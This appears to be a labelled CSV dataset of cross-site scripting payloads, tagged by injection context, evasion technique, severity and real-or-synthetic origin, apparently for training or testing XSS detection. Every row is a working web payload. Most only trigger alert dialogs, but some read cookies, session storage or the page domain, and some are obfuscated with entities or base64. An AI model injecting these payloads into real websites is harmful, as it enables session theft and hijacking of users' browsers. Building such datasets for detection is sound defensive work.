payload,context,technique,severity,length,source
""">><marquee><img src=x onerror=confirm(1)></marquee>""",event_handler,none,medium,53,real
"javascr	ipt:void(confirm(String.fromCharCode(88,83,83)))",js_uri,synthetic,medium,56,synthetic
"<tt onmouseout=""alert(1)"">AnonKryptiQuz</tt>",event_handler,none,medium,44,real
<figure onpointerenter=alert(1) style=display:block>AnonKryptiQuz</figure>,event_handler,none,medium,74,real
"s&#101;tTim&#101;out(""&#97;l&#101;rt(docum&#101;nt.dom&#97;in)"",0)",dom_sink,synthetic,medium,66,synthetic
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",event_handler,none,medium,99,real
"<big draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</big>",event_handler,none,medium,84,real
<figure onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"<style>@keyframes slidein {}</style><command style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></command>",event_handler,none,medium,174,real
"<div draggable=""true"" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>",event_handler,none,medium,117,real
<video onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
<button popovertarget=x>Click me</button><img ontoggle=alert(1) popover id=x>AnonKryptiQuz</img>,event_handler,none,medium,96,real
<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>,event_handler,none,medium,62,real
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(/AmoloHT/)</SCRIPT>,script_injection,case_variation,medium,82,real
"<td onmouseenter=""alert(1)"">AnonKryptiQuz</td>",event_handler,none,medium,46,real
<script>new Function`X${document.location.hash.substr`AnonKryptiQuz`}`</script>,script_injection,none,low,79,real
"<picture oncut=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",event_handler,none,medium,65,real
"<mark onclick=""alert(1)"">AnonKryptiQuz</mark>",event_handler,none,medium,45,real
<scr	ipt>//console.log(document.domain)</scr	ipt>,script_injection,synthetic,medium,49,synthetic
"<dd oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</dd>",event_handler,none,medium,67,real
<script>/x/&#97;l&#101;rt(1)</script>,script_injection,synthetic,medium,37,synthetic
"<legend onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</legend>",event_handler,none,medium,70,real
"<style>:target {color:red;}</style><iframe2 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></iframe2>",event_handler,none,medium,118,real
"<small onmouseover=""alert(1)"">AnonKryptiQuz</small>",event_handler,none,medium,51,real
%22><svg onclick=prompt(document.cookie)>,tag_injection,synthetic,medium,41,synthetic
<svg onerror=console.log(1)/>,tag_injection,synthetic,medium,29,synthetic
<content id=x tabindex=1 onbeforeactivate=alert(1)></content>,event_handler,none,medium,61,real
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></figure>",event_handler,none,medium,105,real
"<video draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,86,real
""" onload=\u0061lert(location.hash) """,attribute_escape,synthetic,medium,36,synthetic
%3Csvg onbegin=confirm(1)%3E,tag_injection,synthetic,medium,28,synthetic
"<audio src=1 href=1 onerror=""javascript:alert(5920)""></audio>",event_handler,none,medium,61,real
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,event_handler,none,medium,60,real
"<marquee onmouseenter=""alert(1)"">AnonKryptiQuz</marquee>",event_handler,none,medium,56,real
"<sub onmouseout=""alert(1)"">AnonKryptiQuz</sub>",event_handler,none,medium,46,real
"<style>:target {transform: rotate(180deg);}</style><a2 id=x style=""transition:transform 2s"" ontransitionrun=print()></a2>",event_handler,none,low,121,real
<img onlo&#97;d=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,55,synthetic
<script ^__^>alert(String.fromCharCode(49))</script ^__^,script_injection,encoding,medium,56,real
<svg><select onload=alert(1)></select>,event_handler,none,medium,38,real
"<i draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</i>",event_handler,none,medium,79,real
""" onb&#101;gin=confirm('XSS') """,attribute_escape,synthetic,medium,31,synthetic
"<frameset oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</frameset>",event_handler,none,medium,68,real
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""AnonKryptiQuz"")>",tag_injection,case_variation,medium,61,real
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onwebkitanimationend=""alert(1)""></frameset>",event_handler,none,medium,107,real
"<meta onclick=""alert(1)"">AnonKryptiQuz</meta>",event_handler,none,medium,45,real
"<html onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</html>",event_handler,none,medium,61,real
"j&#97;vascript:prompt(String.fromCharCode(88,83,83))",js_uri,synthetic,medium,52,synthetic
""" oNclIck=coNsoLe.Log('XSS') """,attribute_escape,synthetic,medium,30,synthetic
"<style>@keyframes slidein {}</style><animatetransform style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></animatetransform>",event_handler,none,medium,186,real
"""`'><script>\xF0\x90\x96\x9Ajavascript:alert(5118)</script>",script_injection,none,medium,59,real
"<style>:target {color:red;}</style><dfn id=x style=""transition:color 1s"" ontransitionstart=alert(1)></dfn>",event_handler,none,medium,106,real
"<video onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</video>",event_handler,none,medium,65,real
"EvaL(""ConSolE.lOg(1)"")",dom_sink,synthetic,medium,22,synthetic
' onclick=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,44,synthetic
%27 onmouseenter=alert(location.hash) %27,attribute_escape,synthetic,medium,41,synthetic
javascript:void(\u0061lert(location.hash)),js_uri,synthetic,medium,42,synthetic
"<dt oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,95,real
"<ol draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</ol>",event_handler,none,medium,60,real
"<div style=xss:expression(alert(1))>
<div style=xss:expression(1)-alert(1)>
<div style=xss:expressio\6e(alert(1))>
<div style=xss:expressio\006e(alert(1))>
<div style=xss:expressio\00006e(alert(1))>
<div style=xss:expressio\6e(alert(1))>
<div style=xss:expressio&#x5c;6e(alert(1))>",generic,encoding,medium,281,real
"<;IMG SRC=""; &;#14;  javascript:alert(';XSS';);"";>;",js_uri,none,medium,51,real
</b><script>alert(document.cookie)</script><b><!--,script_injection,none,high,50,real
"<img src\x12=x onerror=""javascript:alert(1)"">",event_handler,none,medium,45,real
"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>",event_handler,none,medium,115,real
<template onpointermove=alert(1) style=display:block>AnonKryptiQuz</template>,event_handler,none,medium,77,real
"<optgroup draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</optgroup>",event_handler,none,medium,93,real
"<figcaption draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",event_handler,none,medium,98,real
"<svg ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,67,synthetic
"<th onmousedown=""alert(1)"">AnonKryptiQuz</th>",event_handler,none,medium,45,real
<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>,event_handler,none,medium,46,real
"<bgsound onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",event_handler,none,medium,67,real
""" ontoggl&#101;=confirm('XSS') """,attribute_escape,synthetic,medium,32,synthetic
zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//,generic,url_encoding,low,60,real
<param onpointermove=alert(1) style=display:block>AnonKryptiQuz</param>,event_handler,none,medium,71,real
"""><img src=/x onerror=prompt(document.domain);>",event_handler,none,medium,47,real
"<map onmouseout=""alert(1)"">AnonKryptiQuz</map>",event_handler,none,medium,46,real
javascript:confirm(document.domain),js_uri,synthetic,medium,35,synthetic
"<iframe name=""alert(1)"" src=""https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></iframe>",dom_sink,obfuscation,medium,124,real
<tfoot onpointerenter=alert(1) style=display:block>AnonKryptiQuz</tfoot>,event_handler,none,medium,72,real
<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>,event_handler,none,medium,82,real
"<output draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</output>",event_handler,none,medium,88,real
"<style>:target {color: red;}</style><rp id=x style=""transition:color 10s"" ontransitioncancel=print()></rp>",event_handler,none,low,106,real
<style onreadystatechange=alert(1)></style>,event_handler,none,medium,43,real
&#60;script&#62;alert(1)&#60;/script&#62;,generic,html_entity,medium,41,real
"""><Svg onLoaD=cOnsOle.loG(dOcuMenT.cOokIe)>",tag_injection,synthetic,medium,43,synthetic
<scRipT>/*/aLerT(dOcuMenT.dOmaIn)</sCriPt>,script_injection,synthetic,medium,42,synthetic
""" onmouseover=console.log(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,58,synthetic
"<isindex onmousedown=""alert(1)"">AnonKryptiQuz</isindex>",event_handler,none,medium,55,real
"<STYLE>li {list-style-image: url(""javascript:alert(7774)"");}</STYLE><UL><LI>XSS</br>",js_uri,case_variation,medium,84,real
"<optgroup draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</optgroup>",event_handler,none,medium,89,real
%3Csvg onmouseenter=prompt(document.domain)%3E,tag_injection,synthetic,medium,46,synthetic
{{{}.toString.constructor('confirm(1)')()}},template_injection,none,medium,43,real
<rp onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"<noembed draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</noembed>",event_handler,none,medium,72,real
"<image onmousemove=""alert(1)"">AnonKryptiQuz</image>",event_handler,none,medium,51,real
<svg onmouseenter=console.log(document.cookie)>,tag_injection,synthetic,medium,47,synthetic
' oNerRor=coNsoLe.Log(doCumEnt.coOkiE) ',attribute_escape,synthetic,medium,40,synthetic
<span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>,event_handler,none,medium,74,real
žscriptualert(EXSSE)ž/scriptu,generic,none,medium,29,real
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",js_uri,case_variation,medium,85,real
"<param onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,86,real
%22><svg onmouseenter=console.log(1)>,tag_injection,synthetic,medium,37,synthetic
"<map onmouseleave=""alert(1)"">AnonKryptiQuz</map>",event_handler,none,medium,48,real
"<script oncut=""alert(1)"" contenteditable>AnonKryptiQuz</script>",script_injection,none,medium,63,real
"<iframe draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</iframe>",event_handler,none,medium,65,real
"<li oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</li>",event_handler,none,medium,56,real
"<a target=""x"" href=""xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E",generic,url_encoding,low,494,real
"<ul oncontextmenu=""alert(1)"">AnonKryptiQuz</ul>",event_handler,none,medium,47,real
"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"">",js_uri,html_entity,medium,219,real
<input id=x onfocusin=alert(1)>,event_handler,none,medium,31,real
%3Csvg onmouseenter=console.log(document.cookie)/%3E,tag_injection,synthetic,medium,52,synthetic
"<style>@keyframes slidein {}</style><object style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></object>",event_handler,none,medium,172,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hgroup>",event_handler,none,medium,182,real
"<style>:target {transform: rotate(180deg);}</style><hgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hgroup>",event_handler,none,medium,130,real
"<style>:target {color:red;}</style><section id=x style=""transition:color 1s"" ontransitionstart=alert(1)></section>",event_handler,none,medium,114,real
"<q draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</q>",event_handler,none,medium,60,real
"<span onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</span>",event_handler,none,medium,84,real
<var onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style=""position:absolute;"" onanimationcancel=""print()""></label>",event_handler,none,low,179,real
"<script>eval(atob(""YWxlcnQoZG9jdW1lbnQuY29va2llKQ==""))<script>",script_injection,encoding,high,62,real
"<listing draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</listing>",event_handler,none,medium,70,real
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></tbody>",event_handler,none,medium,103,real
"<optgroup ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</optgroup>",event_handler,none,medium,97,real
"<svg ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</svg>",event_handler,none,medium,87,real
<header onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
' oNerRor=alErt(doCumEnt.doMaiN) ',attribute_escape,synthetic,medium,34,synthetic
"<b onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</b>",event_handler,none,medium,55,real
<svg><strong onload=alert(1)></strong>,event_handler,none,medium,38,real
"<script/src=data:,alert()>",script_injection,none,medium,26,real
"<details ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</details>",event_handler,none,medium,95,real
""" oNloAd=ProMpt(1) """,attribute_escape,synthetic,medium,20,synthetic
<scr	ipt>confirm(document.cookie)</scr	ipt>,script_injection,synthetic,medium,43,synthetic
"<style>:target {color:red;}</style><col id=x style=""transition:color 1s"" ontransitionstart=alert(1)></col>",event_handler,none,medium,106,real
"<video autoplay controls onseeked=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,none,medium,97,real
"<head onmouseout=""alert(1)"">AnonKryptiQuz</head>",event_handler,none,medium,48,real
<frameset id=x tabindex=1 ondeactivate=alert(1)></frameset><input id=y autofocus>,event_handler,none,medium,81,real
<colgroup onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,59,real
J&#97;VasCriPt:ConFirM(1),js_uri,synthetic,medium,25,synthetic
"""><svg onmous&#101;&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,68,synthetic
"""><svg onbegin=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,58,synthetic
"<input onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</input>",event_handler,none,medium,72,real
"<blockquote onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</blockquote>",event_handler,none,medium,96,real
"<td onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</td>",event_handler,none,medium,66,real
&#X000003c;,generic,html_entity,low,11,real
' oNloAd=ProMpt(doCumEnt.coOkiE) ',attribute_escape,synthetic,medium,34,synthetic
"<figcaption onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></figcaption>",event_handler,none,medium,293,real
